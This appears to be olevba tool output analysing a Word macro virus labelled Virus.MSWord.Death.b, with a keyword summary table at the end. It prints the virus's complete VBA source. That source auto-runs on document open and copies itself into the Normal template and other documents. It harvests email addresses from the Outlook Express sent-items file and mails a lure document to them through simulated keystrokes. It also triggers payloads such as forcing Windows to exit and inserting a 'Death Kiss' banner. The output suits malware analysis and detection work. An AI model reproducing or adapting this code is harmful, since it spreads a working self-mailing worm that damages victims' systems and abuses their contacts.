olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Death.b-64457ed75161291f7a2980751d17abe5ac9ccb3e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Death.b-64457ed75161291f7a2980751d17abe5ac9ccb3e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AddString.bas 
in file: Virus.MSWord.Death.b-64457ed75161291f7a2980751d17abe5ac9ccb3e - OLE stream: 'Macros/VBA/AddString'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados
Public pq As String



Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Web.AddString.AutoOpen"
 Call AddFile
 Call AddNew
 Call MailNew
 Call Verday
End Sub
 
Sub AddNew()
Attribute AddNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute AddNew.VB_ProcData.VB_Invoke_Func = "Web.AddString.AddNew"
Dim exec
exec = Counter()

On Error GoTo 0
Open pq + "\Death Kiss.Ini" For Output As #1
Print #1, exec + 1
Close #1

Doc = ActiveDocument.Path + "\" + ActiveDocument.Name
dot = NormalTemplate.FullName

On Error Resume Next

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=Doc, _
       Destination:=NormalTemplate.FullName, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0
On Error Resume Next

Application.OrganizerCopy Source:=dot, _
       Destination:=Doc, Name:="AddString", _
       Object:=wdOrganizerObjectProjectItems

Application.OrganizerCopy Source:=dot, _
       Destination:=ActiveDocument.Name, Name:="AddMail", _
       Object:=wdOrganizerObjectProjectItems

On Error GoTo 0

End Sub

Function Counter()
Dim exec
exec = ""
On Error Resume Next
Open pq + "\Death Kiss.Ini" For Input As #1
Input #1, exec
Close #1
On Error GoTo 0
Counter = Val(exec)
End Function

Function AddFile()
Dim meucar As String
cdir = CurDir()

On Error Resume Next
  ChDir "\"
  MkDir "\Windows"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows"
MkDir "Application Users"
On Error GoTo 0

On Error Resume Next
ChDir "\Windows\Application Users"
MkDir "AddFile"
On Error GoTo 0

ChDir cdir
pq = "\Windows\Application Users\AddFile"
On Error GoTo 0

p = ActiveDocument.Path + "\Pesquisa de Opinião.doc"

If Counter() = 0 Then
   On Error Resume Next
   Open p For Binary As #1
   Do While Meulocal < LOF(1)
       meucar = meucar & Input(2048, #1)
       Meulocal = Loc(1)
   Loop
   Close #1

   Open pq + "\Pesquisa de Opinião.doc" For Binary Access Write As #1
   Put #1, , meucar
   Close #1
   On Error GoTo 0
End If
End Function

-------------------------------------------------------------------------------
VBA MACRO AddMail.bas 
in file: Virus.MSWord.Death.b-64457ed75161291f7a2980751d17abe5ac9ccb3e - OLE stream: 'Macros/VBA/AddMail'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'The Microsoft Word Language Visual Basic
'Copyright (c) 1999 Microsoft
'Todos os direitos reservados

Sub MailNew()
Attribute MailNew.VB_Description = "Microsoft Word (c) 1999 Corporation\r\nInternet Mail"
Attribute MailNew.VB_ProcData.VB_Invoke_Func = "Web.AddMail.MailNew"
Dim meucar, Meulocal
Dim s As String
Dim F As Long
Dim correio, vetor(100)

If Not Ismail() Then
  Exit Sub
  Else
   If Endmail() = "Yes" Then
     Exit Sub
   End If
End If

On Error Resume Next
Open "c:\windows\application data\microsoft\outlook express\mail\Itens enviados.mbx" For Binary As #1
Do While Meulocal < LOF(1)
    meucar = meucar & Input(2048, #1)
    Meulocal = Loc(1)
Loop
Close #1
On Error GoTo 0

v = 0
c = 1
flag = True

While flag
c = InStr(c, meucar, "<")

If c > 0 Then
F = InStr(c, meucar, ">")
s = Mid(meucar, c + 1, F - c - 1)
Else
flag = False
End If

If InStr(1, s, "@") > 0 Then
vetor(v) = s
v = v + 1
If v = 100 Then
   flag = False
End If

End If
c = c + 1
Wend

For Each minhatarefa In Tasks
  If v > 0 Then
    F = InStr(1, minhatarefa.Name, "-")
    If F > 0 Then
       c = Mid(minhatarefa.Name, F + 1)
      Else
       c = minhatarefa.Name
    End If
    
    If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
        On Error Resume Next
        minhatarefa.Activate
        minhatarefa.WindowState = wdWindowStateMaximize
        SendKeys "%(R)", True
        SendKeys "N", True
        Exit For
        On Error GoTo 0
    End If
End If
Next minhatarefa

For Each minhatarefa In Tasks
    If InStr(minhatarefa.Name, "Nova mensagem") > 0 Then
        minhatarefa.Activate
        minhatarefa.WindowState = wdWindowStateNormal
        ucar = ""
        Stopmail
       For i = 1 To 100
        If vetor(i) <> "" Then
           ucar = ucar + vetor(i) + ";"
        End If
       Next
       ucar = ucar + "{TAB}" + "{TAB}" + "{TAB}" + "Mensagem Importante" + "{TAB}"
       ucar = ucar + "Estou lhe enviando aquele documento que vc me pediu." + "%(I)x"
       ucar = ucar + pq + "\Pesquisa de Opinião.doc" + "{ENTER}" + "%(A)T" + "{ENTER}"
       SendKeys ucar, True
    End If
Next minhatarefa

For Each minhatarefa In Tasks
    p = InStr(1, minhatarefa.Name, "-")
    c = ""
     If p > 0 Then
         c = Left(minhatarefa.Name, p - 1)
     End If
    If InStr(c, "Microsoft Word") > 0 Then
      minhatarefa.Activate
      Exit For
    End If
Next
End Sub
Function Verday()
Dim con
con = Counter()

If con >= 1000 And con <= 15000 Then
    Tasks.ExitWindows
  Else
   If con >= 80 And con <= 200 Then
     Windows.Arrange
     Windows.Application.ChangeFileOpenDirectory ("c:\windows\Temporary Internet Files")
   End If
   If con > 200 And con <= 220 Then
     Documents.Add.PrintOut
   End If
   
   If con > 500 And con <= 600 Then
    If Tasks.Exists("Calculadora") Then
          With Tasks("Calculadora")
               .Activate
               .WindowState = wdWindowStateNormal
          End With
          SendKeys Str(con), True
      Else
        Shell "calc.exe"
        Tasks("Calculadora").WindowState = wdWindowStateNormal
        SendKeys Str(con), True
     End If
   End If

End If
dia = WeekDay(Date)
hora = Mid(Time(), 1, 2)
rd = LTrim(Str(Int((24 * Rnd) + 1)))

Texto = "((((((((((((((((((((((((( D e a t h   K i s s  )))))))))))))))))))))))))" + Chr(13)
If dia = 6 And hora = rd Then
   Selection.EndKey Unit:=wdStory, Extend:=wdMove
   Set Doc = ActiveDocument
   Set meuIntervalo = Doc.Range(Start:=Doc.Paragraphs(1).Range.End - 1, _
       End:=Doc.Paragraphs(1).Range.End - 1)
       meuIntervalo.InsertAfter Texto
End If
End Function

Function Ismail() As Boolean
For Each minhatarefa In Tasks
flg = False
    F = InStr(1, minhatarefa.Name, "-")
    If F > 0 Then
       c = Mid(minhatarefa.Name, F + 1)
      Else
       c = minhatarefa.Name
    End If
    If InStr(1, minhatarefa.Name, "Outlook Express") > 0 Then
       flg = True
       Exit For
    End If
Next minhatarefa
Ismail = flg
End Function

Function Stopmail() As String
 On Error Resume Next
 Open pq + "\Death End.Ini" For Output As #1
 Print #1, "Yes"
 Close #1
On Error GoTo 0
End Function

Function Endmail()

Dim ret
ret = "No"
 On Error Resume Next
 Open pq + "\Death End.Ini" For Input As #1
 Input #1, ret
 Close #1
 On Error GoTo 0
Endmail = ret
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|IOC       |calc.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

